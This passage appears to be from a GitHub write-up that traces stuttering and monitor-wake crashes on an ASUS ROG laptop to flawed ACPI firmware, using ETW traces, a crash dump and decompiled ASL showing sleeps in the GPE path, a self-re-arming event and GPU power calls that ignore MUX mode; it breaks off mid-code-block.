href="https://private-user-images.githubusercontent.com/76183331/490271181-2aac7320-3e06-4025-841c-86129f9d5b62.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTgxNDAzMDMsIm5iZiI6MTc1ODE0MDAwMywicGF0aCI6Ii83NjE4MzMzMS80OTAyNzExODEtMmFhYzczMjAtM2UwNi00MDI1LTg0MWMtODYxMjlmOWQ1YjYyLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA5MTclMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwOTE3VDIwMTMyM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTRhM2QxYmMzMjA1Yzc2NGU1ZTIzZTdkZGQ2ZmRlMDhhMzE0NzllMzllMGI1MDE1ZTAyMGM0ODMyYmM5ZTBmMDEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.mbhSLEaSYEQDwHJKMsAsd4kOVINCEy5hrIU4nGo5Ffo"><img width="1673" height="516" alt="61c7abb1-d7aa-4b69-9a88-22cca7352f00" src="https://private-user-images.githubusercontent.com/76183331/490271181-2aac7320-3e06-4025-841c-86129f9d5b62.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTgxNDAzMDMsIm5iZiI6MTc1ODE0MDAwMywicGF0aCI6Ii83NjE4MzMzMS80OTAyNzExODEtMmFhYzczMjAtM2UwNi00MDI1LTg0MWMtODYxMjlmOWQ1YjYyLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA5MTclMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwOTE3VDIwMTMyM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTRhM2QxYmMzMjA1Yzc2NGU1ZTIzZTdkZGQ2ZmRlMDhhMzE0NzllMzllMGI1MDE1ZTAyMGM0ODMyYmM5ZTBmMDEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.mbhSLEaSYEQDwHJKMsAsd4kOVINCEy5hrIU4nGo5Ffo"></a><p>Random interruptions often suggest hardware faults or thermal throttling. A perfectly repeating pattern points to a systemic issue, a timer or a scheduled event baked into the system's logic.</p><p>The raw event data confirms this pattern:</p><div><pre><code>Clock-Time (100ns), Event, Kernel(ms), CPU 134024027290917802, _GPE._L02 started, 13.613820, 0 134024027290927629, _SB...BAT0._STA started, 0.000000, 4 134024027290932512, _GPE._L02 finished, -, 6 </code></pre></div><p>The first event, <code>_GPE._L02</code>, is an interrupt handler that takes <strong>13.6 milliseconds</strong> to execute. For a high-priority interrupt, this is an eternity and is catastrophic for real-time system performance.</p><p>Deeper in the trace, another bizarre behavior emerges; the system repeatedly attempts to power the discrete GPU on and off, even when it's supposed to be permanently active.</p><div><pre><code>Clock-Time, Event, Duration 134024027315051227, _SB.PC00.GFX0._PS0 start, 278&mu;s # GPU Power On 134024027315155404, _SB.PC00.GFX0._DOS start, 894&mu;s # Display Output Switch 134024027330733719, _SB.PC00.GFX0._PS3 start, 1364&mu;s # GPU Power Off [~15 seconds later] 134024027607550064, _SB.PC00.GFX0._PS0 start, 439&mu;s # Power On Again! 134024027607657368, _SB.PC00.GFX0._DOS start, 1079&mu;s # Display Output Switch 134024027623134006, _SB.PC00.GFX0._PS3 start, 394&mu;s # Power Off Again! ... </code></pre></div><h3>Why This Behavior is Fundamentally Incorrect</h3><a href="https://github.com#why-this-behavior-is-fundamentally-incorrect"></a><p>This power cycling is nonsensical because the laptop is configured for a scenario where it is impossible: <strong>The system is in Ultimate Mode (via a MUX switch) with an external display connected.</strong></p><p>In this mode:</p><ul> <li>The discrete NVIDIA GPU (dGPU) is the <strong>only</strong> active graphics processor.</li> <li>The integrated Intel GPU (iGPU) is completely powered down and bypassed.</li> <li>The dGPU is wired directly to the internal and external displays.</li> <li>There is no mechanism for switching between GPUs.</li> </ul><p>Yet, the firmware ignores MUX state nudging the iGPU path (GFX0) and, worse, engaging dGPU cut/notify logic (PEGP/PEPD) every 30-60 seconds. The dGPU in mux mode isn't just "preferred" - it's the ONLY path to the display. There's no fallback, and no alternative. When the firmware arms DGCE (power off), it's attempting something architecturally impossible.</p><p>Most of the time, hardware sanity checks refuse these nonsensical commands, but even failed attempts introduce latency spikes causing audio dropouts, input lag, and accumulating performance degradation. Games freeze mid-session, videos buffer indefinitely, system responsiveness deteriorates until restart.</p><h4>The Catastrophic Edge Case</h4><a href="https://github.com#the-catastrophic-edge-case"></a><p>Sometimes, under specific thermal conditions or race conditions, the power-down actually succeeds. When the firmware manages to power down the GPU that's driving the display, the sequence is predictable and catastrophic:</p><ol> <li><strong>Firmware OFF attempt</strong> - cuts the dgpu path via PEG1.DGCE</li> <li><strong>Hardware complies</strong> - safety checks fail or timing aligns</li> <li><strong>Display signal cuts</strong> - monitors go black</li> <li><strong>User input triggers wake</strong> - mouse/keyboard activity</li> <li><strong>Windows calls <code>PowerOnMonitor()</code></strong> - attempt display recovery</li> <li><strong>NVIDIA driver executes <code>_PS0</code></strong> - GPU power on command</li> <li><strong>GPU enters impossible state</strong> - firmware insists OFF, Windows needs ON</li> <li><strong>Driver thread blocks indefinitely</strong> - waiting for GPU response</li> <li><strong>30-second watchdog expires</strong> - Windows gives up</li> <li><strong>System crashes with BSOD</strong></li> </ol><div><pre><code>5: kd&gt; !analyze -v ******************************************************************************* * * * Bugcheck Analysis * * * ******************************************************************************* WIN32K_POWER_WATCHDOG_TIMEOUT (19c) Win32k did not turn the monitor on in a timely manner. Arguments: Arg1: 0000000000000050, Calling monitor driver to power on. Arg2: ffff8685b1463080, Pointer to the power request worker thread. Arg3: 0000000000000000 Arg4: 0000000000000000 ... STACK_TEXT: fffff685`3a767130 fffff800`94767be0 : 00000000`00000047 00000000`00000000 00000000`00000000 00000000`00000000 : nt!KiSwapContext+0x76 fffff685`3a767270 fffff800`94726051 : ffff8685`b1463080 00000027`00008b94 fffff685`3a767458 fffff800`00000000 : nt!KiSwapThread+0x6a0 fffff685`3a767340 fffff800`94724ed3 : fffff685`00000000 00000000`00000043 00000000`00000002 0000008a`fbf50968 : nt!KiCommitThreadWait+0x271 fffff685`3a7673e0 fffff800`9471baf2 : fffff685`3a7675d0 02000000`0000001b 00000000`00000000 fffff800`94724500 : nt!KeWaitForSingleObject+0x773 fffff685`3a7674d0 fffff800`9471b7d5 : ffff8685`9cbec810 fffff685`3a7675b8 00000000`00010224 fffff800`00000003 : nt!ExpWaitForFastResource+0x92 fffff685`3a767580 fffff800`9471b49d : 00000000`00000000 ffff8685`9cbec850 ffff8685`b1463080 00000000`00000000 : nt!ExpAcquireFastResourceExclusiveSlow+0x1e5 fffff685`3a767630 fffff800`28faca9b : fffff800`262ee9c8 00000000`00000003 ffff8685`9cbec810 02000000`00000065 : nt!ExAcquireFastResourceExclusive+0x1bd fffff685`3a767690 fffff800`28facbe5 : ffff8685`b31de000 00000000`00000000 ffffd31d`9a05244f 00000000`00000000 : win32kbase!<lambda_63b61c2369133a205197eda5bd671ee7>::<lambda_invoker_cdecl>+0x2b fffff685`3a7676c0 fffff800`28e5f864 : ffffad0c`94d10878 fffff685`3a767769 ffffad0c`94d10830 ffff8685`b31de000 : win32kbase!UserCritInternal::`anonymous namespace'::EnterCritInternalEx+0x4d fffff685`3a7676f0 fffff800`28e5f4ef : 00000000`00000000 00000000`00000000 fffff800`262ee9c8 00000000`00000000 : win32kbase!DrvSetWddmDeviceMonitorPowerState+0x354 fffff685`3a7677d0 fffff800`28e2abab : ffff8685`b31de000 00000000`00000000 ffff8685`b31de000 00000000`00000000 : win32kbase!DrvSetMonitorPowerState+0x2f fffff685`3a767800 fffff800`28ef22fa : 00000000`00000000 fffff685`3a7678d9 00000000`00000001 00000000`00000001 : win32kbase!PowerOnMonitor+0x19b fffff685`3a767870 fffff800`28ef13dd : ffff8685`94a40700 ffff8685`a2eb31d0 00000000`00000001 00000000`00000020 : win32kbase!xxxUserPowerEventCalloutWorker+0xaaa fffff685`3a767940 fffff800`4bab21c2 : ffff8685`b1463080 fffff685`3a767aa0 00000000`00000000 00000000`00000020 : win32kbase!xxxUserPowerCalloutWorker+0x13d fffff685`3a7679c0 fffff800`26217f3a : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : win32kfull!NtUserUserPowerCalloutWorker+0x22 fffff685`3a7679f0 fffff800`94ab8d55 : 00000000`000005bc 00000000`00000104 ffff8685`b1463080 00000000`00000000 : win32k!NtUserUserPowerCalloutWorker+0x2e fffff685`3a767a20 00007ff8`ee71ca24 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : nt!KiSystemServiceCopyEnd+0x25 000000cc`d11ffbc8 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : 0x00007ff8`ee71ca24 ... </lambda_invoker_cdecl></lambda_63b61c2369133a205197eda5bd671ee7></code></pre></div><p>The crash dump confirms the thread is stuck in <code>win32kbase!DrvSetWddmDeviceMonitorPowerState</code>, waiting for the NVIDIA driver to respond. It can't because it's caught between a confused power state, windows wanting to turn on the GPU while the firmware is arming the GPU cut off.</p><h3>Understanding General Purpose Events</h3><a href="https://github.com#understanding-general-purpose-events"></a><p>GPEs are the firmware's mechanism for signaling hardware events to the operating system. They are essentially hardware interrupts that trigger the execution of ACPI code. The trace data points squarely at <code>_GPE._L02</code> as the source of our latency.</p><p>A closer look at the timing reveals a consistent and problematic pattern:</p><div><pre><code>_GPE._L02 Event Analysis from ROG Strix Trace: Event 1 @ Clock 134024027290917802 Duration: 13,613,820 ns (13.61ms) Triggered: Battery and AC adapter status checks Event 2 @ Clock 134024027654496591 Duration: 13,647,255 ns (13.65ms) Triggered: Battery and AC adapter status checks Event 3 @ Clock 134024028048493318 Duration: 13,684,515 ns (13.68ms) Triggered: Battery and AC adapter status checks Interval between events: ~36-39 seconds Consistency: The duration is remarkably stable and the interval is periodic. </code></pre></div><h3>The Correlation</h3><a href="https://github.com#the-correlation"></a><p>Every single time the lengthy <code>_GPE._L02</code> event fires, it triggers the exact same sequence of ACPI method calls.</p><a href="https://private-user-images.githubusercontent.com/76183331/490271340-01326c61-b7a2-4c12-a907-8433f43a6a72.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTgxNDAzMDMsIm5iZiI6MTc1ODE0MDAwMywicGF0aCI6Ii83NjE4MzMzMS80OTAyNzEzNDAtMDEzMjZjNjEtYjdhMi00YzEyLWE5MDctODQzM2Y0M2E2YTcyLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA5MTclMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwOTE3VDIwMTMyM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTJlYWQyOTFmYzQ1OGU0ZTkwZmNkNjVlNDZiZDFlZjBmZjZiMDhiNjc3ZWJiZjI1NDkwNjljMjhlNjgxODQ0OWMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.WAL-Fn8DUavumaNDSHFBe7OposTNO5vo0lQlfSMaTzU"><img width="589" height="589" alt="64921999-7614-4706-a5ac-54c39c38fd0b" src="https://private-user-images.githubusercontent.com/76183331/490271340-01326c61-b7a2-4c12-a907-8433f43a6a72.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTgxNDAzMDMsIm5iZiI6MTc1ODE0MDAwMywicGF0aCI6Ii83NjE4MzMzMS80OTAyNzEzNDAtMDEzMjZjNjEtYjdhMi00YzEyLWE5MDctODQzM2Y0M2E2YTcyLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA5MTclMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwOTE3VDIwMTMyM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTJlYWQyOTFmYzQ1OGU0ZTkwZmNkNjVlNDZiZDFlZjBmZjZiMDhiNjc3ZWJiZjI1NDkwNjljMjhlNjgxODQ0OWMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.WAL-Fn8DUavumaNDSHFBe7OposTNO5vo0lQlfSMaTzU"></a><p>The pattern is undeniable:</p><ol> <li>A hardware interrupt fires <code>_GPE._L02</code>.</li> <li>The handler executes methods to check battery status.</li> <li>Shortly thereafter, the firmware attempts to change the GPU's power state.</li> <li>The system runs normally for about 30-60 seconds.</li> <li>The cycle repeats.</li> </ol> <h2>Extracting and Decompiling the Firmware Code</h2><a href="https://github.com#extracting-and-decompiling-the-firmware-code"></a><p></p><h3>Getting to the Source</h3><a href="https://github.com#getting-to-the-source"></a><p>To analyze the code responsible for this behavior, we must extract and decompile the ACPI tables provided by the BIOS to the operating system.</p><div><pre><span><span>#</span> Extract all ACPI tables into binary .dat files</span> acpidump -b <span><span>#</span> Output includes:</span> <span><span>#</span> DSDT.dat - The main Differentiated System Description Table</span> <span><span>#</span> SSDT1.dat ... SSDT17.dat - Secondary System Description Tables</span> <span><span>#</span> Decompile the main table into human-readable ACPI Source Language (.dsl)</span> iasl -d DSDT.dsl</pre></div><p>This decompiled ASL provides a direct view into the firmware's executable logic. It is a precise representation of the exact instructions that the ACPI.sys driver is fed by the firmware and executes at the highest privilege level within the Windows kernel. Any logical flaws found in this code are the direct cause of the system's behavior.</p><h3>Finding the GPE Handler</h3><a href="https://github.com#finding-the-gpe-handler"></a><p>Searching the decompiled <code>DSDT.dsl</code> file, we find the definition for our problematic GPE handler:</p><div><pre><span>Scope</span> (<span>_GPE</span>) { <span>Method</span> (<span>_L02</span>, , <span>NotSerialized</span>) <span>// _Lxx: Level-Triggered GPE</span> { \<span>_SB</span>.PC00.LPCB.ECLV () } }</pre></div><p>This code is simple: when the <code>_L02</code> interrupt occurs, it calls a single method, <code>ECLV</code>. The "L" prefix in <code>_L02</code> signifies that this is a <strong>level-triggered</strong> interrupt, meaning it will continue to fire as long as the underlying hardware condition is active. This is a critical detail.</p><h3>The Catastrophic <code>ECLV</code> Implementation</h3><a href="https://github.com#the-catastrophic-eclv-implementation"></a><p>Following the call to <code>ECLV()</code>, we uncover a deeply flawed implementation that is the direct cause of the system-wide stuttering.</p><div><pre><span>Method</span> (ECLV, , <span>NotSerialized</span>) <span>// Starting at line 099244</span> { <span>// Main loop - continues while events exist OR sleep events are pending</span> <span>// AND we haven't exceeded our time budget (TI3S &lt; 0x78)</span> <span>While</span> (((CKEV() != <span>Zero</span>) || (SLEC != <span>Zero</span>)) &amp;&amp; (TI3S &lt; <span>0x78</span>)) { <span>Local1</span> = <span>One</span> <span>While</span> (<span>Local1</span> != <span>Zero</span>) { <span>Local1</span> = GEVT() <span>// Get next event from queue</span> LEVN (<span>Local1</span>) <span>// Process the event</span> TIMC += <span>0x19</span> <span>// Increment time counter by 25</span> <span>// This is where it gets really bad</span> <span>If</span> ((SLEC != <span>Zero</span>) &amp;&amp; (<span>Local1</span> == <span>Zero</span>)) { <span>// No events but sleep events pending</span> <span>If</span> (TIMC == <span>0x19</span>) { <span>Sleep</span> (<span>0x64</span>) <span>// Sleep for 100 milliseconds!!!</span> TIMC = <span>0x64</span> <span>// Set time counter to 100</span> TI3S += <span>0x04</span> <span>// Increment major counter by 4</span> } <span>Else</span> { <span>Sleep</span> (<span>0x19</span>) <span>// Sleep for 25 milliseconds!!!</span> TI3S++ <span>// Increment major counter by 1</span> } } } } <span>// Here's where it gets even worse</span> <span>If</span> (TI3S &gt;= <span>0x78</span>) <span>// If we hit our time budget (120)</span> { TI3S = <span>Zero</span> <span>If</span> (EEV0 == <span>Zero</span>) { EEV0 = <span>0xFF</span> <span>// Force another event to be pending!</span> } } }</pre></div><h3>Breaking Down this monstrosity</h3><a href="https://github.com#breaking-down-this-monstrosity"></a><p>This short block of code violates several fundamental principles of firmware and kernel programming.</p><p><strong>Wtf 1: Sleeping in an Interrupt Context</strong></p><div><pre><span>Sleep</span> (<span>0x64</span>) <span>// 100ms sleep</span> <span>Sleep</span> (<span>0x19</span>) <span>// 25ms sleep</span></pre></div><p>An interrupt handler runs at a very high priority to service hardware requests quickly. The <code>Sleep()</code> function completely halts the execution of the CPU core it is running on (CPU 0 in this case). While CPU 0 is sleeping, it cannot:</p><ul> <li>Process any other hardware interrupts.</li> <li>Allow the kernel to schedule other threads.</li> <li>Update system timers.</li> </ul> <blockquote><p>Clarification: These Sleep() calls live in the ACPI GPE handling path for the GPE L02, these calls get executed at PASSIVE_LEVEL after the SCI/GPE is acknowledged so it's not a raw ISR (because i don't think windows will even allow that) but analyzing this further while the control method runs the GPE stays masked and the ACPI/EC work is serialized. With the Sleep() calls inside that path and the self rearm it seems to have the effect of making ACPI.sys get tied up in long periodic bursts (often on CPU 0) which still have the same effect on the system.</p></blockquote><p><strong>Wtf 2: Time-Sliced Interrupt Processing</strong> The entire loop is designed to run for an extended period, processing events in batches. It's effectively a poorly designed task scheduler running inside an interrupt handler, capable of holding a CPU core hostage for potentially seconds at a time.</p><p><strong>Wtf 3: Self-Rearming Interrupt</strong></p><div><pre><span>If</span> (EEV0 == <span>Zero</span>) { EEV0 = <span>0xFF</span> <span>// Forces all EC event bits on</span> }</pre></div><p>This logic ensures that even if the Embedded Controller's event queue is empty, the code will create a new, artificial event. This guarantees that another interrupt will fire shortly after, creating the perfectly periodic pattern of ACPI spikes observed in the traces.</p><h2>The Event Dispatch System</h2><a href="https://github.com#the-event-dispatch-system"></a><p></p><h3>How Events Route to Actions</h3><a href="https://github.com#how-events-route-to-actions"></a><p>The LEVN() method takes an event and routes it:</p><div><pre><span>Method</span> (LEVN, <span>1</span>, <span>NotSerialized</span>) { <span>If</span> ((<span>Arg0</span> != <span>Zero</span>)) { MBF0 = <span>Arg0</span> P80B = <span>Arg0</span> <span>Local6</span> = <span>Match</span> (LEGA, <span>MEQ</span>, <span>Arg0</span>, <span>MTR</span>, <span>Zero</span>, <span>Zero</span>) <span>If</span> ((<span>Local6</span> != <span>Ones</span>)) { LGPA (<span>Local6</span>) } } } </pre></div><h3>The <code>LGPA</code> Dispatch Table</h3><a href="https://github.com#the-lgpa-dispatch-table"></a><p>The LGPA() method is a giant switch statement handling different events:</p><div><pre><span>Method</span> (LGPA, <span>1</span>, <span>Serialized</span>) <span>// Line 098862</span> { <span>Switch</span> (<span>ToInteger</span> (<span>Arg0</span>)) { <span>Case</span> (<span>Zero</span>) <span>// Most common case - power event</span> { DGD2 () <span>// GPU-related function</span> ^EC0._QA0 () <span>// EC query method</span> PWCG () <span>// Power change - this is our battery polling</span> } <span>Case</span> (<span>0x18</span>) <span>// GPU-specific event</span> { <span>If</span> (M6EF == <span>One</span>) { <span>Local0</span> = <span>0xD2</span> } <span>Else</span> { <span>Local0</span> = <span>0xD1</span> } NOD2 (<span>Local0</span>) <span>// Notify GPU driver</span> } <span>Case</span> (<span>0x1E</span>) <span>// Another GPU event</span> { <span>Notify</span> (^^PEG1.PEGP, <span>0xD5</span>) <span>// Direct GPU notification</span> ROCT = <span>0x55</span> <span>// Sets flag for follow-up</span> } } }</pre></div><p>This shows a direct link: a GPE fires, and the dispatch logic calls functions related to battery polling and GPU notifications.</p><h2>The Battery Polling Function</h2><a href="https://github.com#the-battery-polling-function"></a><p>The <code>PWCG()</code> method, called by multiple event types, is responsible for polling the battery and AC adapter status.</p><div><pre><span>Method</span> (PWCG, , <span>NotSerialized</span>) { <span>Notify</span> (ADP0, <span>Zero</span>) <span>// Tell OS to check the AC adapter</span> ^BAT0.<span>_BST</span> () <span>// Execute the Battery Status method</span> <span>Notify</span> (BAT0, <span>0x80</span>) <span>// Tell OS the battery status has changed</span> ^BAT0.<span>_BIF</span> () <span>// Execute the Battery Information method </span> <span>Notify</span> (BAT0, <span>0x81</span>) <span>// Tell OS the battery info has changed</span> }</pre></div><p>Which we can see here:</p><a href="https://private-user-images.githubusercontent.com/76183331/490271565-f6c62050-b470-49bd-ad55-35def0fff893.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTgxNDAzMDMsIm5iZiI6MTc1ODE0MDAwMywicGF0aCI6Ii83NjE4MzMzMS80OTAyNzE1NjUtZjZjNjIwNTAtYjQ3MC00OWJkLWFkNTUtMzVkZWYwZmZmODkzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA5MTclMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwOTE3VDIwMTMyM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTQxZDY4NDJmMDY2Y2Y5N2IwOWE5ZGE2MTY3YWJjYzY5YTc4NDYzZDRlMWYxYjdkM2JjN2I4OWQzNzE4MGExYWQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.yD48p7YEsmte6xBlewsTDmkA5wpPNa1ulgdm4oSeSSk"><img width="1043" height="315" alt="image" src="https://private-user-images.githubusercontent.com/76183331/490271565-f6c62050-b470-49bd-ad55-35def0fff893.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTgxNDAzMDMsIm5iZiI6MTc1ODE0MDAwMywicGF0aCI6Ii83NjE4MzMzMS80OTAyNzE1NjUtZjZjNjIwNTAtYjQ3MC00OWJkLWFkNTUtMzVkZWYwZmZmODkzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA5MTclMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwOTE3VDIwMTMyM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTQxZDY4NDJmMDY2Y2Y5N2IwOWE5ZGE2MTY3YWJjYzY5YTc4NDYzZDRlMWYxYjdkM2JjN2I4OWQzNzE4MGExYWQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.yD48p7YEsmte6xBlewsTDmkA5wpPNa1ulgdm4oSeSSk"></a><p>Each of these operations requires communication with the Embedded Controller, adding to the workload inside the already-stalled interrupt handler.</p><h3>The GPU Notification System</h3><a href="https://github.com#the-gpu-notification-system"></a><p>The <code>NOD2()</code> method sends notifications to the GPU driver.</p><div><pre><span>Method</span> (NOD2, <span>1</span>, <span>Serialized</span>) { <span>If</span> ((<span>Arg0</span> != DNOT)) { DNOT = <span>Arg0</span> <span>Notify</span> (^^PEG1.PEGP, <span>Arg0</span>) } <span>If</span> ((ROCT == <span>0x55</span>)) { ROCT = <span>Zero</span> <span>Notify</span> (^^PEG1.PEGP, <span>0xD1</span>) <span>// Hardware-Specific</span> } }</pre></div><p>These notifications (<code>0xD1</code>, <code>0xD2</code>, etc.) are hardware-specific signals that tell the NVIDIA driver to re-evaluate its power state, which prompts driver power-state re-evaluation; in traces this surfaces as iGPU GFX0._PSx/_DOS toggles plus dGPU state changes via PEPD._DSM/DGCE.</p><h2>The Mux Mode Confusion: A Firmware with a Split Personality</h2><a href="https://github.com#the-mux-mode-confusion-a-firmware-with-a-split-personality"></a><p>Here's where a simple but catastrophic oversight in the firmware's logic causes system-wide failure. High-end ASUS gaming laptops feature a MUX (Multiplexer) switch, a piece of hardware that lets the user choose between two distinct graphics modes:</p><ol> <li><strong>Optimus Mode:</strong> The power-saving default. The integrated Intel GPU (iGPU) is physically connected to the display. The powerful NVIDIA GPU (dGPU) only renders demanding applications when needed, passing finished frames to the iGPU to be drawn on screen.</li> <li><strong>Ultimate/Mux Mode:</strong> The high-performance mode. The MUX switch physically rewires the display connections, bypassing the iGPU entirely and wiring the NVIDIA dGPU directly to the screen. In this mode, the dGPU is not optional; it is the <strong>only</strong> graphics processor capable of outputting an image.</li> </ol><p>Any firmware managing this hardware <strong>must</strong> be aware of which mode the system is in. Sending a command intended for one GPU to the other is futile and, in some cases, dangerous. Deep within the ACPI code, a hardware status flag named <code>HGMD</code> is used to track this state. To understand the flaw, we first need to decipher what <code>HGMD</code> means, and the firmware itself gives us the key.</p><h4><strong>Decoding the Firmware's Logic with the Brightness Method</strong></h4><a href="https://github.com#decoding-the-firmwares-logic-with-the-brightness-method"></a><p>For screen brightness to work, the command must be sent to the GPU that is physically controlling the display backlight. A command sent to the wrong GPU will simply do nothing. Therefore, the brightness control method (<code>BRTN</code>) <em>must</em> be aware of the MUX switch state to function at all. It is the firmware's own Rosetta Stone.</p><div><pre><span>// Brightness control - CORRECTLY checks for mux mode</span> <span>Method</span> (BRTN, <span>1</span>, <span>Serialized</span>) <span>// Line 034003</span> { <span>If</span> (((DIDX &amp; <span>0x0F0F</span>) == <span>0x0400</span>)) { <span>If</span> (HGMD == <span>0x03</span>) <span>// 0x03 = Ultimate/Mux mode</span> { <span>// In mux mode, notify discrete GPU</span> <span>Notify</span> (\<span>_SB</span>.PC00.PEG1.PEGP.EDP1, <span>Arg0</span>) } <span>Else</span> { <span>// In Optimus, notify integrated GPU</span> <span>Notify</span> (\<span>_SB</span>.PC00.GFX0.DD1F, <span>Arg0</span>) } } }</pre></div><p>The logic here is flawless and revealing. The code uses the <code>HGMD</code> flag to make a binary decision. If <code>HGMD</code> is <code>0x03</code>, it sends the command to the NVIDIA GPU. If not, it sends it to the Intel GPU. The firmware itself, through this correct implementation, provides the undeniable definition: <strong><code>HGMD == 0x03</code> means the system is in Ultimate/Mux Mode.</strong></p><h4><strong>The Logical Contradiction: Unconditional Power Cycling in a Conditional Hardware State</strong></h4><a href="https://github.com#the-logical-contradiction-unconditional-power-cycling-in-a-conditional-hardware-state"></a><p>This perfect, platform-aware logic is completely abandoned in the critical code paths responsible for power management. The <code>LGPA</code> method, which is called by the stutter-inducing interrupt, dispatches power-related commands to the GPU <em>without ever checking the MUX mode</em>.</p><div><pre><span>// GPU power notification - NO MUX CHECK!</span> <span>Case</span> (<span>0x18</span>) { <span>// This SHOULD have: If (HGMD != 0x03)</span> <span>// But it doesn't, so it runs even in mux mode</span> <span>If</span> (M6EF == <span>One</span>) { <span>Local0</span> = <span>0xD2</span> } <span>Else</span> { <span>Local0</span> = <span>0xD1</span> } NOD2 (<span>Local0</span>) <span>// Notifies GPU regardless of mode</span> }</pre></div><h3>Another Path to the Same Problem: The Platform Power Management DSM</h3><a href="https://github.com#another-path-to-the-same-problem-the-platform-power-management-dsm"></a><p>This is not a single typo. A second, parallel power management system in the firmware exhibits the exact same flaw. The Platform Extension Plug-in Device (<code>PEPD</code>) is used by Windows to manage system-wide power states, such as turning off displays during modern standby.</p><div><pre><span>Device</span> (PEPD) <span>// Line 071206</span> { <span>Name</span> (<span>_HID</span>, <span>"INT33A1"</span>) <span>// Intel Power Engine Plugin</span> <span>Method</span> (<span>_DSM</span>, <span>4</span>, <span>Serialized</span>) <span>// Device Specific Method</span> { <span>// ... lots of setup code ...</span> <span>// Arg2 == 0x05: "All displays have been turned off"</span> <span>If</span> ((<span>Arg2</span> == <span>0x05</span>)) { <span>// Prepare for aggressive power saving</span> <span>If</span> (<span>CondRefOf</span> (\<span>_SB</span>.PC00.PEG1.DHDW)) { ^^PC00.PEG1.DHDW () <span>// GPU pre-shutdown work</span> ^^PC00.PEG1.DGCE = <span>One</span> <span>// Set "GPU Cut Enable" flag</span> } <span>If</span> (S0ID == <span>One</span>) <span>// If system supports S0 idle</span> { GUAM (<span>One</span>) <span>// Enter low power mode</span> } ^^PC00.DPOF = <span>One</span> <span>// Display power off flag</span> <span>// Tell USB controller about display state</span> <span>If</span> (<span>CondRefOf</span> (\<span>_SB</span>.PC00.XHCI.PSLI)) { ^^PC00.XHCI.PSLI (<span>0x05</span>) } } <span>// Arg2 == 0x06: "A display has been turned 